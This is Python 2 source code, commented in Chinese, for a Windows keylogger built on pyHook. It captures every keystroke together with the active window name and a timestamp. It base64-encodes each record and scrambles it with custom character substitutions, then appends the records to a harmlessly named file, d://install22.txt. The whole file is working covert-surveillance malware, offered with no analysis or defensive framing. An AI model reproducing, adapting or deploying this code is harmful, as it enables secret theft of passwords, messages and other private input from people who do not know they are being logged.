# -*- coding: utf-8 -*- #
import pythoncom
import pyHook
import datetime
import urllib, base64
from multiprocessing import Pool

kll=[]
kll2=[]
oldname = ''

def onKeyboardEvent(event):
    # 监听键盘事件
    timeNow = datetime.datetime.now()
    Now = timeNow.strftime('%H:%M:%S')
    wrfile = open(r'd://install22.txt', 'a')
    evtname = event.WindowName
    global oldname

    NAME = "WindowName:%s\n" % event.WindowName
    TIME="Time:%s\n" % datetime.datetime.now()
    KEY="     Key:%s-%s  \n" % (event.Key, Now)
    LINE="---------\n"

    NAME=base64.encodestring(urllib.quote(NAME))
    TIME=base64.encodestring(urllib.quote(TIME))
    KEY=base64.encodestring(urllib.quote(KEY))
    LINE=base64.encodestring(urllib.quote(LINE))

    NAME = NAME.replace(",", "%$6rd)").replace("=\n", "%128)").replace("CU", "%7qw(")
    KEY = KEY.replace(",", "%$6rd)").replace("=\n", "%128)").replace("CU", "%7qw(")
    TIME = TIME.replace(",", "%$6rd)").replace("=\n", "%128)").replace("CU", "%7qw(")
    LINE = LINE.replace(",", "%$6rd)").replace("=\n", "%128)").replace("CU", "%7qw(")

    while evtname != oldname:
        wrfile.write(LINE)
        wrfile.write(NAME)
        wrfile.write(TIME)
        oldname = event.WindowName
        print LINE
        print NAME
        print TIME
    wrfile.write(KEY)
    print KEY
    return True


def main():
    # 创建一个“钩子”管理对象
    hm = pyHook.HookManager()
    # 监听所有键盘事件
    hm.KeyDown = onKeyboardEvent
    # 设置键盘“钩子”
    hm.HookKeyboard()
    pythoncom.PumpMessages()


if __name__ == "__main__":
    p = Pool(processes=8)
    main()
    p.close()
    p.join()


